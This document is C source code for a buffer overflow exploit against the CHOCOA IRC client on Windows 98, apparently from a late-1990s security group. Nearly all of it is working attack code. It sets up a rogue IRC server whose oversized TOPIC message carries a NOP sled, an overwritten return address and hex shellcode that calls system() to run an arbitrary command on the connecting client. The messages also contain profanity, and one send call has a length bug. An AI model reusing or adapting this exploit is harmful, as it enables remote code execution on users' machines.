/*=============================================================================
   IRC Client CHOCOA Version 1.0beta7R Exploit for Windows98
   The Shadow Penguin Security (http://shadowpenguin.backsection.net)
   Written by
    UNYUN     (shadowpenguin@backsection.net)
    R00t Zer0 (defcon0@ugtop.com)
  =============================================================================
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define     RETADR          610
#define     JMPADR          606
#define     JMPOFS          6
#define     BUFEND          2200
#define     JMP_EBX_ADR     0xbff7a06b
#define     CMDLENP         0x41
#define     PORT            6667
#define     COMMAND         "notepad.exe \\autoexec.bat"
#define     FUNC            "msvcrt.dll.system.exit."

#define     NOP             0x90
#define     JMPS            0xeb

unsigned char exploit_code[200]={
  0xEB,0x4B,0x5B,0x53,0x32,0xE4,0x83,0xC3,0x0B,0x4B,0x88,0x23,0xB8,0x50,0x77,
  0xF7,0xBF,0xFF,0xD0,0x8B,0xD0,0x52,0x43,0x53,0x52,0x32,0xE4,0x83,0xC3,0x06,
  0x88,0x23,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,0xF0,0x5A,0x43,0x53,0x52,
  0x32,0xE4,0x83,0xC3,0x04,0x88,0x23,0xB8,0x28,0x6E,0xF7,0xBF,0xFF,0xD0,0x8B,
  0xF8,0x43,0x53,0x83,0xC3,0x0B,0x32,0xE4,0x88,0x23,0xFF,0xD6,0x33,0xC0,0x50,
  0xFF,0xD7,0xE8,0xB0,0xFF,0xFF,0xFF,0x00};

#define OPENING_MSG \
    ":irc.hoge.com 001 FUCKER "\
    ":Welcome to the Internet Relay Network FUCKER!=fuck@127.0.0.1\n"\
    ":End of /MOTD command.\n"

#define JOIN1 \
    ":fucker!=fuck@127.0.0.1 JOIN "\
    ":#fuck\n"\
    ":irc.hoge.com 353 fucker @ #fuck "\
    ":fucker uzee"

#define JOIN2 \
    ":irc.hoge.com 366 fucker #fuck "\
    ":End of /NAMES list.\n"

void handleSIGCHLD(int i)
{
    int status;

    wait(&status);
    signal(SIGCHLD, handleSIGCHLD);
}

int main(int argc, char *argv[])
{
    int     serv_sock,cli_sock;
    int     pid,clilen,p,ip;
    char    buff[30000],jank[10000];
    struct  sockaddr_in serv_addr;
    struct  sockaddr_in cli_addr;
    
    signal( SIGCHLD, handleSIGCHLD );

    memset(jank,NOP,BUFEND);
    strcat(exploit_code,FUNC);
    strcat(exploit_code,COMMAND);
    exploit_code[CMDLENP]=strlen(COMMAND);
    strncpy(jank+RETADR+4,exploit_code,strlen(exploit_code));

    ip=JMP_EBX_ADR;
    jank[JMPADR]  =JMPS;
    jank[JMPADR+1]=JMPOFS;
    jank[RETADR+3]=0xff&(ip>>24);
    jank[RETADR+2]=0xff&(ip>>16);
    jank[RETADR+1]=0xff&(ip>>8);
    jank[RETADR]  =ip&0xff;
    jank[BUFEND]  =0;

    if((serv_sock=socket(PF_INET,SOCK_STREAM,0))<0){
        perror("socket");
        exit(1);
    }
    bzero(( char *)&serv_addr, sizeof(serv_addr));
    serv_addr.sin_family        = PF_INET;
    serv_addr.sin_addr.s_addr   = htonl(INADDR_ANY);
    serv_addr.sin_port          = htons(PORT);
    if(bind(serv_sock,(struct sockaddr *)&serv_addr,sizeof(serv_addr))<0){
        perror("bind");
        exit(1);
    }
    listen(serv_sock,5 );
    
    while(1){
        clilen   = sizeof(cli_addr);
        cli_sock = accept(serv_sock,(struct sockaddr *)&cli_addr,&clilen);
        if( cli_sock<0){
            if(errno==EINTR) continue;
            perror("accept" );
            exit(1);
        }
        if((pid=fork())<0){
            perror( "fork" );
            exit(1);
        }
        if(pid==0){
            close(serv_sock);
            send(cli_sock, OPENING_MSG, strlen(OPENING_MSG),0);
            send(cli_sock, JOIN1, strlen(JOIN1),0);
            send(cli_sock, "\n",1,0 );
            send(cli_sock, JOIN2, strlen(buff),0);
            sprintf( buff, ":fucker!~fuck@127.0.0.1 TOPIC #fuck :%s\n", jank );
            send(cli_sock, buff, strlen(buff),0);
            sleep(1800);
            exit(0);
        }else
            close(cli_sock);
    }
}

